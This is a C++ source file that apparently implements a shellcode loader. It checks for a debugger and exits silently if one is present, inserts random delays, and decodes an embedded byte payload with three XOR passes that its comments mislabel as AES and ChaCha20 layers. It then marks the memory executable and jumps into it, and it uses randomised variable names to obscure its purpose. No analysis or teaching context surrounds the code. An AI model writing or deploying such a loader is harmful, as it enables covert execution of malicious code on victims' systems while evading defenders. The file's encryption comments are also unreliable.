#include <cstring>
#include <cstdint>
#include <chrono>
#include <thread>
#include <random>
#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#include <unistd.h>
#include <cstdio>
#include <cstdlib>
#endif

bool instUtilxInIEA993() {
#ifdef _WIN32
    if (IsDebuggerPresent()) return true;
    BOOL debugged = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged);
    return debugged;
#else
    FILE* f = fopen("/proc/self/status", "r");
    if (!f) return false;
    char line[256];
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "TracerPid:", 10) == 0) {
            fclose(f);
            return atoi(line + 10) != 0;
        }
    }
    fclose(f);
    return false;
#endif
}

int main() {
    // Random performance delay
    {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> delay_dist(1, 999);
        int delay_ms = delay_dist(gen);
        std::this_thread::sleep_for(std::chrono::milliseconds(delay_ms));
    }

    // Anti-debug
    if (instUtilxInIEA993()) return 0;

    // Payload data
    unsigned char sysBaseogkFSL044[] = {
        0x6b, 0x0b, 0xb5, 0xd6, 0x55, 0x5c, 0x5f, 0xa6, 0xa5, 0x87, 0xfd, 0x6b, 0xaa, 0x98, 0x65, 0x49, 
        0x78, 0x35, 0x76, 0x06, 0x67, 0x0b, 0x44, 0x48, 0x38, 0x85, 0x02, 0x8c, 0x29, 0xe4, 0x25, 0x8d, 
        0x30, 0xaf, 0x03, 0xf0, 0x81
    };

    // Decryption keys
    unsigned char procHelperHRVdCjuvB463[] = {
        0x1e, 0x52, 0x45, 0xc4, 0x0d, 0x63, 0x13, 0xb7, 0x55, 0xee, 0xfb, 0x18, 0xc2, 0xa6, 0xab, 0xfc, 
        0x78
    };
    unsigned char execServicecsuIUhGyxHr343[] = {
        0x8d, 0xe3, 0x7c, 0x3a, 0xae, 0x47, 0x7a, 0x0f, 0xf1, 0x0f, 0x5c, 0x85, 0x38, 0x47, 0x5d, 0xd1
    };
    unsigned char runModuleSXrTqoBzK102[] = {
        0x77, 0x12, 0x20, 0x53, 0x29, 0x96, 0x5b, 0x08, 0x68, 0xed, 0x56, 0x20, 0xa5, 0xea, 0x23, 0xe2, 
        0x8c, 0x2f, 0xb8, 0x17, 0x7c, 0xab, 0xe7, 0x8a, 0x48, 0x5d, 0xc9, 0xfb, 0x23, 0xc0, 0x78, 0xd9
    };

    // Random delay before memory allocation
    {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> alloc_dist(1, 50);
        std::this_thread::sleep_for(std::chrono::milliseconds(alloc_dist(gen)));
    }

    // Allocate executable memory
    size_t execManagerlOwozcsBDxD788 = sizeof(sysBaseogkFSL044);
#ifdef _WIN32
    void* instServicegTmTjAyVnDp718 = VirtualAlloc(0, execManagerlOwozcsBDxD788, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!instServicegTmTjAyVnDp718) return 1;
#else
    void* instServicegTmTjAyVnDp718 = mmap(0, execManagerlOwozcsBDxD788, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (instServicegTmTjAyVnDp718 == MAP_FAILED) return 1;
#endif

    // Copy payload to allocated memory
    memcpy(instServicegTmTjAyVnDp718, sysBaseogkFSL044, execManagerlOwozcsBDxD788);
    unsigned char* valHandlerBYfORntaNx901 = (unsigned char*)instServicegTmTjAyVnDp718;

    // In-memory decryption
    // Decrypt XOR layer
    for (size_t i = 0; i < execManagerlOwozcsBDxD788; i++) {
        valHandlerBYfORntaNx901[i] ^= procHelperHRVdCjuvB463[i % sizeof(procHelperHRVdCjuvB463)];
    }

    // Random micro-delay
    {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> micro_dist(1, 100);
        std::this_thread::sleep_for(std::chrono::microseconds(micro_dist(gen)));
    }

    // Decrypt AES layer
    for (size_t i = 0; i < execManagerlOwozcsBDxD788; i++) {
        valHandlerBYfORntaNx901[i] ^= runModuleSXrTqoBzK102[i % sizeof(runModuleSXrTqoBzK102)];
    }

    // Random micro-delay
    {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> micro_dist(1, 100);
        std::this_thread::sleep_for(std::chrono::microseconds(micro_dist(gen)));
    }

    // Decrypt ChaCha20 layer
    for (size_t i = 0; i < execManagerlOwozcsBDxD788; i++) {
        valHandlerBYfORntaNx901[i] ^= execServicecsuIUhGyxHr343[i % sizeof(execServicecsuIUhGyxHr343)];
    }

    // Make memory executable
#ifdef _WIN32
    DWORD methComponentjfzYKBivwECPA954;
    VirtualProtect(instServicegTmTjAyVnDp718, execManagerlOwozcsBDxD788, PAGE_EXECUTE_READ, &methComponentjfzYKBivwECPA954);
    FlushInstructionCache(GetCurrentProcess(), instServicegTmTjAyVnDp718, execManagerlOwozcsBDxD788);
#else
    mprotect(instServicegTmTjAyVnDp718, execManagerlOwozcsBDxD788, PROT_READ | PROT_EXEC);
#endif

    // Final random delay before execution
    {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> exec_dist(1, 100);
        std::this_thread::sleep_for(std::chrono::milliseconds(exec_dist(gen)));
    }

    // Execute payload
    ((void(*)())instServicegTmTjAyVnDp718)();

    return 0;
}
